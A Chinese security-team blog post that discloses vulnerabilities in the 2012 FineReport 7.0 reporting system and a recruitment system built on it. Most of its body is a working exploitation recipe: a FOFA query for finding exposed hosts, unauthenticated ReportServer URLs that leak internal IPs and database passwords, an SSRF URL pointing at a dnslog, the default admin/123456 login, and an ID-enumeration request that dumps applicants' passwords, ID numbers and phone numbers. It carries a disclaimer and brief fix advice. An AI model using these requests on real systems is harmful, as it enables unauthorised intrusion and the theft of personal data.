> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nltw2N8_MB87UosnGDv6kA)

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

前言  

“

**申明****：本次测试只作为学习用处，请勿未授权进行渗透测试，切勿用于其它用途！  
**

**五一假期，给大家发个 Day + 抽一波奖！  
**

**（抽奖推文在公众号发的最新的文章中）**

**这个曾经团队刚开始运作时已经发过了，这次写详细点拿出来分享！**  

****此漏洞由团队老大 小小小月球 及 goddmeon 一起挖的  
****

**在此感谢****小小小月球 & goddmeon******  

”

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 1 漏洞背景****

  

  

  

“

**帆软报表系统是一款纯 Java 编写的、集数据展示 (报表) 和数据录入 (表单) 功能于一身的企业级 web 报表工具。**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCia9ATjLySiaBSb89uAUJuntHL2jnMlOH4aPiaqN6Ro7Oiaxe1tM0ic4asHg/640?wx_fmt=png)

”

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 2 漏洞描述****

  

“

**帆软报表系统历史版本存在****默认口令****及****未授权访问****漏洞。  
**

**攻击者可利用漏洞获取敏感信息，并执行未授权操作。**  

”

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 3 漏洞影响范围****

  

“

**FineReport 7.0 版本**

**属于 2012 年的历史版本**

**此版本现已不再维护  
**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBC6NEzIlYVIcyicOuictFB4j35kRicYnW3AEaSN69mfWHibBeT3PQiaKNqn5w/640?wx_fmt=png)

”  

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 4 FoFa 语法****

  

“

```
"down.download?FM_SYS_ID" && title="招聘"
```

”  

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 5 漏洞复现****

  

“

**帆软报表系统 2012 版本存在未授权访问 + 内网数据库用户名密码泄露 + 通用弱口令**

**未授权部分  
**

**1. 未授权查看访问内网 ip**

```
http://XXXXXX/ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCWFyBvmURTxVicB8icXqf64TV15HL8YdM3WwKia4pxRXBNAA9ic64Gz1H6Q/640?wx_fmt=png)

**2. 未授权重置授权**  

```
http://XXXXXX/ReportServer?op=fr_server&cmd=sc_version_info&showtoolbar=false
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBC7jPmhA7wd8HCYFrsosvrpiaC4AFwxT4sAnG5NChURNOwJcFbESszzPQ/640?wx_fmt=png)

**3. 查看数据库密码**  

```
http://XXXXXX/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCia7DvZPbjA8o1RtQqzLVhB0VCwq0ply6IRAftHliabZjQe4N7UR5Qhag/640?wx_fmt=png)

**4.SSRF**

```
http://XXXXXX/ReportServer?op=resource&resource=dnslog地址
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCibVFsz3SVAUgIYGEHSKErTUlIxp8g5LzE8TASuzsLvibK2VibFsvzRU0Q/640?wx_fmt=png)

**5. 默认弱口令  
**

```
后台地址：
/ReportServer?op=fr_auth&cmd=ah_loginui&_=1619795319853
口令：
admin / 123456
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCUbCvgDC0r1CuQLNkkCMBDAgosYVa3oJhNrBy57pQibhFc8JNknURYAg/640?wx_fmt=png)

**在挖掘这个报表系统漏洞的过程中，发现这个报表系统是搭载在一个招聘系统的后面的  
**

**（感觉这其实是帆软的招聘系统，而这个招聘系统用到了帆软报表）  
**

**有可能也不是这样的，欢迎师傅指正！**  

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCfIB4FUQY5S9Drdc5F5KxVaEbZAWRb1aDwQo2sx39HxR5w6lzX1vyvQ/640?wx_fmt=png)

**既然帆软报表系统的洞都发了，这个招聘系统的洞也顺便发出来吧！  
**

**访问下面这个地址，**先注册个账户**,  
**

**注意一下 url 中的  
**

**FM_SYS_ID** **参数不是固定的，每个网站是不一样的**

```
https://XXXXXX/project/shyyxy/default/recruitLogin.jsp?FM_SYS_ID=XXXXXX&FM_SYS_CODE=SYSTEM_RECRUIT#
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCniatnPibk8ljxJRIGffxBlfAHbgAqvbsrHStGRAYqthbZ1o2IddHjMNQ/640?wx_fmt=png)

**测试账户 XXXXXX XXXXXX  
**

**登录进去后，点击我的申请再抓包，有个** **id** **参数可以遍历。**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBC0ZIEmvYuiajaPfliccLgoRMib9vPu5ajN744RPD1e5Q9tuiaRFn4CuWy0A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCLuItnR1kmSKfYTsDm65BNhduY7YRWXDX5zRmmYXXwuxhCcNqZz8PdQ/640?wx_fmt=png)

**可以看到很多 id 存在，就不一一测试了  
**

**改成 2138 后（****2138 是一个特殊的 id 值****），点新增  
**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBC0ZIEmvYuiajaPfliccLgoRMib9vPu5ajN744RPD1e5Q9tuiaRFn4CuWy0A/640?wx_fmt=png)

**然后点击申请人框框处，发现输出了所有账户和密码（身份证电话等敏感信息）  
**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCGhCAB3JWtHpARwybR45T4YUib1BRy55x5nu8ia9n1DyiaF0TicEXYVUJBQ/640?wx_fmt=png)

**图中 4Q 开头的密码为 123456  
**

**另一个接口处同样存在这个漏洞  
**

**登陆后访问  
**

**再次提醒，url 中的**

**FM_SYS_ID** **每个站点时不同的**

```
https://XXXXXX/base/hr/a.do?action=list&entityId=HR_RECRUIT_USER&FM_SYS_ID=XXXXXX&_dc=1615462290692&columnFieldNames=ID,ACCOUNT,NAME,PASSWORD,EMAIL,REGISTER_DATE,PHONE,TYPE#,ID_CODE,IS_LOGIN#&search.NAME#like=&searchMode=simple&page=1&start=0&limit=500
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBChZMH9dPmriaIIYicWLfE8YIxZK94IicmacMS2W9icGW7BGQHVPhDPgwARg/640?wx_fmt=png)

**涉及信息过多，打厚码**  

”

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 6 修复建议****

  

“

**受影响的是 FineReport 7.0 版本，属于公司 2012 年的历史版本，此版本现已不再维护。  
**

**漏洞中提及的客户近期已联系修改系统密码来降低风险，若还有其他客户有类似问题，需要主动联系官方技术支持咨询下处理方案，技术支持方式见**

```
https://www.fanruan.com/support
```

”

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 7 关于抽奖****

  

“

**乘五一假期给大家抽个奖哈  
****大家可以看下另一篇今天发的抽奖文章哈****  
奖品为：  
1、某大学漏洞报送证书 * 1  
2、安全相关书籍 (可选，具体书单在推文中)*1  
3、金士顿 32G USB3.0 U 盘 * 1  
4、edusrc 邀请码 * 4  
**

”

**如果对你有帮助的话  
那就长按二维码，关注我们吧！**  

![](https://mmbiz.qpic.cn/mmbiz_png/Qx4WrVJtMVKBxb9neP6JKNK0OicjoME4RvV4HnTL7ky0RhCNB0jrJ66pBDHlSpSBIeBOqCrOTaWZ2GNWv466WNg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/EWF7rQrfibGYIzeAryXG89shFicuMUhR5eYdoSEffib7WmrGvGmSPpdvYfpGIA7YGKFMoF1IrXutHXuD8tBBbAYJg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/wKOZZiacmHTc9LIKRXddrzz6MosLdiaH4EQNQgzsrSXHObdAia8yeIlLz6MbK9FxNDr44G7FNb2DBufqkjpwiczAibA/640?wx_fmt=png)

**![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)**  [实战 | 我的 SRC 挖掘 - 如何一个洞拿下百分 QAQ](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485758&idx=1&sn=cafc83acbfd9de667bdceb85c04b9d77&chksm=c07fb2caf7083bdc18f1beae464118405003a18aa47aa6edbf51929a7da1ff47042a8b2190ae&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)  [记一次相对完整的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485464&idx=2&sn=23ac41201aa38ba22881c06632d60ce0&chksm=c07fb3ecf7083afa9b32725c4b288b11e376550f1d88b96243c649f5fe91ba9ea13be7b10d75&scene=21#wechat_redirect)  

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif) [实战 | SQL 注入 - BOOL 盲注 - 一个小细节](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485586&idx=1&sn=148764c1aab126a76b0c459ec67dc1f8&chksm=c07fb366f7083a70301714c87c8d09d3ee2c0dd2567360a46e87372c62a0f0415074ca06631a&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)  [实战 | 一次简单的信息收集到 getshell 的过程](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485252&idx=1&sn=88464e7c793a168d7f1c2506414c1695&chksm=c07fbcb0f70835a6a768376c3ee586e384b4e314d59aedaed0c04a2d6c9237e7314205e0f9dc&scene=21#wechat_redirect)

右下角求赞求好看，喵~